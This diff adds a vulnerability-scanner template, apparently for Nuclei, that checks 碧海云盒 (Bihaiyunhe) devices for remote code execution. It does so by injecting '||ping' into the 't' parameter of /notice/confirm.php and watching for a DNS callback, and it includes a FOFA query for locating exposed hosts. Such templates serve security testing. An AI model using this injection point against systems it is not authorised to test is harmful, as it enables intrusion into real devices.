@@ -1,0 +1,25 @@
+id: bihaiyunhe-rce
+
+info:
+  name: Bihaiyunhe RCE
+  author: zp857
+  severity: critical
+  tags: bihaiyunhe,rce
+  metadata:
+    fofa-query: 'title="碧海云盒"'
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/notice/confirm.php?t=||ping%20-nc%201%20{{interactsh-url}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: status
+        status:
+          - 200
